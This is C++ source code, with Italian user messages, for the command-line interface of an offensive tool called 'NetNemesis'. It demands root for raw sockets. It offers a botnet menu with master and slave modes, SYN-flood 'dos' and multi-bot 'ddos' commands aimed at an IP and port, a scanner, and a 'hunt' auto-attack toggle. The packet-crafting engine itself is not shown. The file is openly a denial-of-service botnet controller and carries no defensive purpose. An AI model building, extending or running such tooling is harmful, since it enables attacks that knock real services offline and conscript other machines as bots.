#include "netnemesis.h"

std::atomic<bool> g_running(true);
std::atomic<bool> g_is_master(false);
std::atomic<bool> g_is_slave(false);
std::atomic<bool> g_auto_hunt(false);
std::mutex g_print_mutex;

bool checkRoot() {
    if (getuid() != 0) {
        std::cerr << "\033[31m[ERRORE] NetNemesis richiede privilegi root per i raw sockets!\033[0m" << std::endl;
        std::cerr << "Esegui con: sudo ./netnemesis" << std::endl;
        return false;
    }
    return true;
}

int main() {
    if (!checkRoot()) {
        return 1;
    }
    
    NetNemesisCLI cli;
    cli.run();
    
    return 0;
}
// Aggiungi a netnemesis.h prima di implementare
NetNemesisCLI::NetNemesisCLI() : attack_engine(&botnet) {}

void NetNemesisCLI::showBanner() {
    const char* banners[] = {
        R"(
    _   __      __   _  __                __
   / | / /___  / /__| |/ /___  __  ______/ /
  /  |/ / __ \/ / _ \   / __ \/ / / / __  / 
 / /|  / /_/ / /  __/   / /_/ / /_/ / /_/ /  
/_/ |_/\____/_/\___/_/|_\____/\__,_/\__,_/   
    [ Packet Crafting Edition - Linux Only ]
)",
        R"(
    ███╗   ██╗███████╗████████╗███╗   ██╗███████╗███╗   ███╗███████╗███████╗██╗███████╗
    ████╗  ██║██╔════╝╚══██╔══╝████╗  ██║██╔════╝████╗ ████║██╔════╝██╔════╝██║██╔════╝
    ██╔██╗ ██║█████╗     ██║   ██╔██╗ ██║█████╗  ██╔████╔██║█████╗  ███████╗██║███████╗
    ██║╚██╗██║██╔══╝     ██║   ██║╚██╗██║██╔══╝  ██║╚██╔╝██║██╔══╝  ╚════██║██║╚════██║
    ██║ ╚████║███████╗   ██║   ██║ ╚████║███████╗██║ ╚═╝ ██║███████╗███████║██║███████║
    ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝╚══════╝
                                    [ ROOT REQUIRED ]
)",
    };
    srand(time(NULL));
    std::cout << "\033[35m" << banners[rand() % 2] << "\033[0m" << std::endl;
}

void NetNemesisCLI::botnetInteractiveMenu() {
    std::cout << "\n\033[36m╔════════════════════════════════╗\n";
    std::cout << "║     BOTNET CONFIGURATION       ║\n";
    std::cout << "╠════════════════════════════════╣\n";
    std::cout << "║  1. MASTER - Diventa master    ║\n";
    std::cout << "║  2. SLAVE  - Connettiti a master║\n";
    std::cout << "║  3. BACK   - Torna al menu     ║\n";
    std::cout << "╚════════════════════════════════╝\033[0m\n";
    std::cout << "Scelta: ";
    
    int scelta;
    std::cin >> scelta;
    std::cin.ignore();
    
    if (scelta == 1) {
        std::cout << "Inserisci porta per il MASTER [default: 6666]: ";
        std::string port_str;
        std::getline(std::cin, port_str);
        int port = port_str.empty() ? DEFAULT_BOTNET_PORT : std::stoi(port_str);
        botnet.startMaster(port);
    } else if (scelta == 2) {
        std::cout << "Inserisci IP del MASTER: ";
        std::string ip;
        std::getline(std::cin, ip);
        std::cout << "Inserisci porta del MASTER [default: 6666]: ";
        std::string port_str;
        std::getline(std::cin, port_str);
        int port = port_str.empty() ? DEFAULT_BOTNET_PORT : std::stoi(port_str);
        botnet.startSlave(ip, port);
    }
}

void NetNemesisCLI::run() {
    Utils::clearScreen();
    showBanner();
    
    std::string input;
    while (g_running) {
        std::cout << "\033[32mroot@NetNemesis\033[0m";
        if (g_is_master) std::cout << "\033[31m[MASTER]\033[0m";
        if (g_is_slave) std::cout << "\033[33m[SLAVE]\033[0m";
        std::cout << ":# ";
        
        std::getline(std::cin, input);
        if (input.empty()) continue;
        
        auto args = Utils::split(input, ' ');
        std::string cmd = args[0];
        
        if (cmd == "clear") {
            Utils::clearScreen();
            showBanner();
        }
        else if (cmd == "botnet") {
            botnetInteractiveMenu();
        }
        else if (cmd == "dos" && args.size() >= 3) {
            attack_engine.executeDOS(args[1], std::stoi(args[2]));
        }
        else if (cmd == "ddos" && args.size() >= 3) {
            int bots = (args.size() > 3) ? std::stoi(args[3]) : 10;
            attack_engine.executeDDOS(args[1], std::stoi(args[2]), bots);
        }
        else if (cmd == "scan") {
            scanner.start();
        }
        else if (cmd == "hunt") {
            g_auto_hunt = !g_auto_hunt;
            Utils::logWarning(g_auto_hunt ? "HUNT MODE: ON" : "HUNT MODE: OFF");
        }
        else if (cmd == "exit") {
            g_running = false;
            botnet.stop();
            scanner.stop();
        }
        else if (cmd == "help") {
            std::cout << R"(
\033[36mComandi disponibili:
  botnet          - Menu configurazione botnet
  dos <ip> <port> - SYN Flood attack (raw packets)
  ddos <ip> <port> [bots] - Distributed attack
  scan            - Avvia scanner passivo
  hunt            - Toggle auto-attack
  clear           - Pulisci schermo
  exit            - Esci\033[0m
)" << std::endl;
        }
    }
}